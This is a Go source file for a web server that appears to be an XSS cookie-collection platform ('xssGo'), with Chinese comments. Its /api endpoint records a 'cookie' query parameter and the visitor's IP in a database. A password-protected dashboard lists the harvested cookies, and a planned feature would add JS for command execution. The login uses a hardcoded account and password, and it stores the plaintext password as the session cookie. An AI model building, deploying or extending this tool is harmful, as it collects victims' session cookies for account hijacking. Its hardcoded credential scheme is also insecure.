package view

import(
	"github.com/gin-gonic/gin"
	"xssGo/db"
	"net/http"
	_"strconv"
	"time"
	_"fmt"
)


// 路由设置界面
func LoadUrl(r *gin.Engine) {
	r.GET("/login",Html)               // 登陆界面静态资源
	r.POST("/login",Login)              // 接受POST账号密码 
	r.GET("/logout",Logout)             // 注销cookie中的内容
	// 登陆页面
    r.GET("/", Jump , HtmlDashboard )  
    r.GET("/delete", Jump , DeleteCookie ) 
    // 增加 - 本地增加js代码，用于命令执行 [未完成]
    r.POST("/add",Logout)               // 新建js代码
    // 接口
    r.GET("/api", Api)              
}




// 登陆页面 - 已完成
func Html(c *gin.Context) {
	c.HTML(http.StatusOK, "login.html", gin.H{})
}



// 验证跳转页面 - 编写中
func Jump(c *gin.Context) {
	account := "jljcxy@XSSpayload"                // 获取管理员密码
	loginCookie, _ := c.Cookie("is_login")        // 获取cookie判断 直接管理员账号判断导致问题存在
	if account != loginCookie {
		c.Redirect(http.StatusFound, "/login")    // 跳转到登陆处
		c.Abort()
		return
	} else {
		c.Next()                                  // Next 应该仅可以在中间件中使用，它在调用的函数中的链中执行挂起的函数。 简单说就是在没请求的时候返回的数据啥的
	}
}


// 登陆账号密码验证
func Login(c *gin.Context) {
	loginName := c.PostForm("us")             // 获取登陆账号
	loginPwd  := c.PostForm("pd")             // 获取登陆密码

	account   := "polarnightsec"                          // 获取账号
	password  := "jljcxy@XSSpayload"                      // 获取密码

	if loginName == account {                 // 账号密码正确添加cookie 名is_login 值为 用户名
		if loginPwd == password {
			c.SetCookie("is_login", password, 60*60*24, "/", "*", false, true)      // https://www.jianshu.com/p/259b6fda35ea 可以加密密码作为cookie
			//c.JSON(http.StatusOK, error.ErrSuccessNull())                         // 一个接口 这里都是使用json格式来传输数据
			//c.Redirect(http.StatusFound, "/")
			c.Redirect(http.StatusFound, "/")
		}
	}
	c.Redirect(http.StatusFound, "/login")
	//c.JSON(http.StatusOK, error.ErrLoginFail())                                   // 密码错误 估计是在js里面进行的设置，遇到json数据返回什么样的内容啥的
}

// 登出功能 - 已完成
func Logout(c *gin.Context) {                      // 登出，删除cookie内容
	c.SetCookie("is_login", "", -1, "/", "*", false, true)
	c.Redirect(http.StatusFound, "/login")
}

// 管理页面 - 编写中
func HtmlDashboard(c *gin.Context) {
	/*
	//c.HTML(http.StatusOK, "dashboard.html", gin.H{})
	// 从数据库获取数据 - 获取数据数量
	sqlWeb := `select count(1) as sum from xss_info where leixing="WEB";`
	resultWeb := db.Query(sqlWeb)
	webSum := strconv.FormatInt(resultWeb[0]["sum"].(int64), 10)       // strconv.FormatInt 转化为string
	//fmt.Println(webSum)                                                // 显示数量
	*/

	//输出到展示面板中 - 获取数据内容
	//id, _ := c.GetQuery("id")
	sqlcookie := `select id,leixing,cookie,time,ip from xss_info where id!=-1;`
	result := db.Query(sqlcookie)
	//fmt.Println(result)    
	c.HTML(http.StatusOK, "dashboard.html", gin.H{
		"dataList": result,
	}) 

}



// xss api接口 - 编写中
func Api(c *gin.Context) {
	cookie := c.Query("cookie")     // 是 c.Request.URL.Query().Get("lastname") 的简写
    // 测试获取请求IP
    clientip := c.ClientIP()        // fmt.Println(clientip)	
	c.HTML(http.StatusOK, "api.html", gin.H{})
	if cookie != "" {
		ReportWeb(cookie,clientip)           // 接收数据，存储到数据中
	}
}
  


// 将XSS数据写入数据库中
func ReportWeb(cookie string, ip string ) {
	sql := `INSERT INTO xss_info(leixing,cookie,time,ip) values(?,?,?,?);`
	db.Insert(sql, "WEB", cookie, time.Now().Format("2006-01-02 15:04:05"),ip)
}





// 删除 cookie
func DeleteCookie(c *gin.Context) {
	// 接收并删除
	id, _ := c.GetQuery("id")
	sqldelete := `delete from xss_info where id=?;`
	db.Delete(sqldelete,id)
	// 测试模版 - 跳转
	c.Redirect(http.StatusFound, "/")
}
















